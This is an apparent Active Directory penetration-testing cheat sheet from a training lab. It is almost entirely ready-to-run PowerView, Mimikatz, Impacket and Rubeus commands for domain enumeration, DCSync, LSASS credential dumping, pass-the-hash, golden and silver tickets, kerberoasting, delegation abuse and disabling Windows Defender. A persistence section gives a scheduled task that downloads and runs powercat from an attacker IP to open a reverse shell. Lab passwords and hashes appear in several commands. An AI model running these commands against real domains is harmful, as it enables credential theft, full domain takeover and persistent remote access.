# Enum-AD Environnement

Tool used:
- Powerview (https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- Impacket Script

other ...

# RECON 

# DOMAIN

Get-NetDomain / Get-NetDomain -Domain "otherdomain" (enum domain)

Get-DomainSID

Get-DomainPolicy

Get-NetDomainController / Get-NetDomainController –Domain "otherdomain"

# USER / GROUP

Get-NetUser / Get-NetUser –Username student1 (enum user)

Get-UserProperty / Get-UserProperty –Properties pwdlastset (enum user properties)

Get-NetComputer / Get-NetComputer –OperatingSystem "*Server 2016* (Get a list of computers in the current domain)

Get-NetGroup / Get-NetGroup –Domain "targetdomain" (enum group) / Get-NetGroup *admin (all grp with admin word)

Get-NetGroupMember -GroupName "Domain Admins" -Recurse (Get all the members of the Domain Admins group)

Get-NetGroup –UserName "user" (Get the group membership for a user)

Get-NetLocalGroup -ComputerName "computername" -ListGroups (List all the local groups on a machine) need privs

Get-NetLocalGroup -ComputerName "computername" -Recurse (Get members of all the local groups on a machine) need privs

Get-NetLoggedon –ComputerName "servername" (Get actively logged users on a computer) local privs

Get-LoggedonLocal -ComputerName "computername" (Get locally logged users on a computer) needs remote registry on the target

# SHARE

Invoke-ShareFinder –Verbos (Find shares on hosts in current domain)

Invoke-FileFinder –Verbose (Find sensitive files on computers in the domain)

Get-NetFileServer (Get all fileservers of the domain)

# OU

Get-NetOU -FullData (Get OUs in a domain)

Get-NetOU "OUFound"

Get-NetOU "OUFound" | %{Get-NetComputer -ADSPath $_} (get computer)

Get-NetGPO -GPOname "{AB306569-220D-43FF-B03B-83E8F4EF8081} (Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU)

# GPO

Get-NetGPO / Get-NetGPO -ComputerName "computername" (Get list of GPO in current domain)

Get-NetGPOGroup (Get GPO(s) which use Restricted Groups or groups.xml for interesting user)

Find-GPOComputerAdmin –Computername "computername" (Get users which are in a local group of a machine using GPO)

Get-NetGPO -ADSpath 'LDAP://CN={C4F31C31-6258-4991-AAAD-454934E882AE},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local'

Find-GPOLocation -UserName "user" -Verbose (Get machines where the given user is member of a specific group)

# ACLs

Get-ObjectAcl -SamAccountName "users" –ResolveGUIDs (Get the ACLs associated with the specified object)

Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbos (Get the ACLs associated with the specified prefix to be used for search)

Invoke-ACLScanner -ResolveGUID (Search for interesting ACEs)

Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "GroupName"}

Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol (Get the ACLs associated with the specified path)

# TRUST / FOREST

Get-NetDomainTrust / Get-NetDomainTrust –Domain "domain"

Get-NetForest / Get-NetForest –Forest "forestname"

Get-NetForestDomain / Get-NetForestDomain –Forest eurocorp.local (Get all domains in the current forest)

Get-NetForestCatalog / Get-NetForestCatalog –Forest eurocorp.local (Get all global catalogs for the current forest)

Get-NetForestTrust / Get-NetForestTrust –Forest "forestname" (Map trusts of a forest)

Get-NetForestDomain -Verbose | Get-NetDomainTrust (GET ALL TRUST OF A FOREST)

# User Hunting

/!\ really noisy /!\

Find-LocalAdminAccess –Verbose (Find all machines on the current domain where the current user has local admin access)

-- more info about this command : query the dc to get list of all the computer of the domain (Get-NetComputer) and then query each machine on the domain with "Invoke-CheckLocalAdminAccess" --

Invoke-UserHunter / Invoke-UserHunter -GroupName "RDPUsers" (Find computers where a domain admin (or specified user/group) has sessions)

Invoke-UserHunter -CheckAccess (To confirm admin access)

Invoke-UserHunter -Stealth (Find computers where a domain admin is logged-in)

//Defense -> .\NetCease.ps1 (change permissions on the netsession enum method by removing permission for authenticated users group. 

# Priv Esc

PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

exploit: Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student202'

Invoke-AllChecks

# APP LOCKER

Get-AppLockerPolicy -Effective

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Disable Windows Defender

Set-MpPreference -PUAProtection 0
Set-MpPreference -DisableArchiveScanning  $true
Set-MpPreference -DisableIntrusionPreventionSystem  $true
Set-MpPreference -DisableRealtimeMonitoring $true

# EXPLOITATION PHASE

## DCSync right check

For specific user:

```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "<USER-TO-CHECK>") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

For all user of the domain:
```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```

DC Sync With MIMIKATZ
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

DCSync with secretdump
```
secretsdump.py -hashes <> -just-dc-ntlm <domain>/<user>@<IP-DC>
```

### ADD DCSync Right to USER
```
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName <..USER..> -Rights DCSync -Verbose
```
# Modify Security Descriptor

### Give user right to execute remotely WMI:

```
Set-RemoteWMI -UserName <user> -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
```
exec:
```
gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```


### Give access to winrm PS console to a user:
```
Set-RemotePSRemoting -UserName <user> -ComputerName <remotehost> -Verbose
```
exec:
```
Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

### Retrieve Hash machine without Domain Admin right:
```
Add-RemoteRegBackdoor -ComputerName <FQDN-MACHINE> -Trustee <user> -Verbose
```
exec:
```
Get-RemoteMachineAccountHash -ComputerName <FQDN-MACHINE> -Verbose
```

# PTH with Mimikatz

Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell.exe"'

# Mimikatz Dump LSASS

Invoke-Mimikatz (basic)

Invoke-Mimikatz -Command '"sekurlsa::ekeys"' (to get AES keys)

Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"' (credentials like those used for scheduled tasks are stored in the credential vault)

# Golden & Silver Ticket
  
### With ticketer

ticketer.py -nthash <krbtgthash> -domain-sid <sid> -user-id 500 -domain <domain> <user>

getST.py -k -no-pass -dc-ip <IP> -spn cifs/<FQDNMachine> <domain>/<user>

psexec.py -k -no-pass -dc-ip <IP> <domain>/<user>@<FQDNMachine>

### With Mimikatz

Invoke-Mimikatz -Command '"kerberos::golden /domain:<..> /sid:<..> /target:<FQDN> /service:HOST /rc4:<hash> /user:Administrator /ptt'" (silver)

# Enum Delegation

python3 findDelegation.py dollarcorp.moneycorp.local/student202:t3dBtZYM4dWh5iKM -dc-ip 172.16.2.1

# BloodHound

coming ...
  
# Load script through PSSESSION
```
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess
```
upload script:
```
Copy-Item -ToSession $appsrv1 -Path C:\AD\Tools\Rubeus.exe -Destination C:\Users\appadmin\Downloads
```
# Kerberoasting - ASK TGS

find:
```
crackmapexec ldap <dcip> -u <user> -p <password> --kdcHost <dcip> --kerberoasting output.txt
```
crack TGS offline:
```
hashcat -m 13100 <hash> -a 0 <wordlist> -o outputfile.txt
```

# AS-REP - ASK TGT
find:
```
crackmapexec ldap <dcip> -u <user> -p <password> --kdcHost <dcip> --asreproast output.txt
```
crack TGT offline:
```
hashcat -m 18200 <hash> -a 0 <wordlist> -o outputfile.txt
```

# Abuse ACL

### Set AS-REP to user
```
Set-DomainObject -Identity <User> -XOR @{useraccountcontrol=4194304} -Verbose
```
### Set SPN to user
```
Set-DomainObject -Identity <User> -Set @{serviceprincipalname='dcorp/<whateverServiceName>'} -Verbose
```
  
# Unconstrained Delegation
find
```
findDelegation.py <domain>/<user>:<pass> -dc-ip <IP>
```
or
```
Get-NetComputer -Unconstrained
```
  
If local priv admin, possibility to dump ticket and re-use it:

dump:
```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```
re-use/inject:
```
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user500\[0;1a5d18]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

### CAN ALSO use the printer bug:

monitor ticket with rubeus:
```
.\Rubeus.exe monitor /interval:5 /nowrap
```
trigger printer bug:
```
python3 printbug.py dollarcorp.moneycorp.local/student202:t3dBtZYM4dWh5iKM@172.16.2.1 dcorp-appsrv.dollarcorp.moneycorp.local
```
then inject the tgt:
```
.\Rubeus.exe ptt /ticket:<ticket>
```
  
# Contrained delegation
### with rubeus
asktgt for the server/user with contrained delegation:
```
.\Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<user> /ptt
```
asktgs with previous tgt and impersonate domain admin:
```
.\Rubeus.exe s4u /domain:<domain> /impersonateuser:Administrator /msdsspn:"<service>" /ticket:<TGT> /ptt
```
### with impacket 
asktgt for the server/user with contrained delegation:
```
getTGT.py -hashes :<hash> <domain>/<user-with-contrainedDELEG> -dc-ip <ip>
```
asktgs with previous tgt and impersonate domain admin:
```
getST.py -k -no-pass -dc-ip <ip> -spn <service> -impersonate Administrator <domain>/<user>
```
for example, we could psexec if delegate for cifs:
```
psexec.py <domain>/<user-impersonate>@<FQDN-TargetMachine> -k -no-pass -target-ip <ip> -dc-ip <ip>
```
  
### With kekeo 
  
we can request tgs for another service since there is no sname validation:

ask TGT:
```
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:5e77978a734e3a7f3895fb0fdbda3b96
```
ask tgs and force ldap service tgs:
```
tgs::s4u /tgt:<TGT-Generated-Before>/user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.local|ldap/dcorp-dc.dollarcorp.moneycorp.local
```
then inject the ticket with mimikatz:
```
Invoke-Mimikatz -Command '"kerberos::ptt <Ticket.kirbi>"'
```
or
### with rubeus
```
.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:Administrator /msdsspn:"time/dcorp-dc.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
-> then we can dcsync with mimikatz because we got ldap tgs as domain admin

--------------------------------------------------------------

# Check LIST

− Users

− Computers

− Domain Administrators

− Enterprise Administrators

− Shares

-----------------------------------------

− List all the OUs

− List all the computers in the StudentMachines OU. -> Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}

− List the GPOs

− Enumerate GPO applied on the StudentMachines OU

-----------------------------------------

− ACL for the Users group

− ACL for the Domain Admins group

− All modify rights/permissions for the studentx

-----------------------------------------

- Enumerate all domains in the moneycorp.local forest.

- Map the trusts of the dollarcorp.moneycorp.local domain.

- Map External trusts in moneycorp.local forest.

- Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?

-----------------------------------------

- Exploit a service on dcorp-studentx and elevate privileges to local administrator.

- Identify a machine in the domain where studentx has local administrative access.

- Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.

-----------------------------------------


-----------------------------------------


-----------------------------------------

Check SPN -> kerberoasting -> crack offline hash

AS-REPs Roasting -> ASKTGT for the specific user

Find Delegation : Uncontrained / Constrained

Check DNSAdmin right

Check TGT or TGS in memory of compromise machine


# Persistance
  
Via schedule task (ex: when u get silver ticket to a dc):
  ```
   schtasks /create /S <COMPUTER> /SC
Weekly /RU "NT Authority\SYSTEM" /TN myTask /TR "powershell.exe -c 'iex
(New-Object Net.WebClient).DownloadString(''http://<my_ip_addr>/powercat''');salut -c <ip> <port> -e cmd'"

 schtasks /Run /S <COMPUTER> /TN myTask
  ```

DSRM persistance

Custom SSP -> clear text password

AdminSDHolder persistance

Give ACL perm DCSync to a user

Security Descriptors -> modif remote access methods for specific user (wmi)

Skeleton Key (!!!!!!)


-----------------------------------------------------------------------------

### Impacket
```python3 findDelegation.py -hashes <:hash> FQDN/user -dc-ip <ip>```
### Pywerview 
```pywerview get-netuser -u cturpin --hashes 8432ec4c4f9b9ce96b73a6451a1d9dcc -d telecorp.local -t DC-01 --dc-ip 10.10.50.15 --unconstrained```


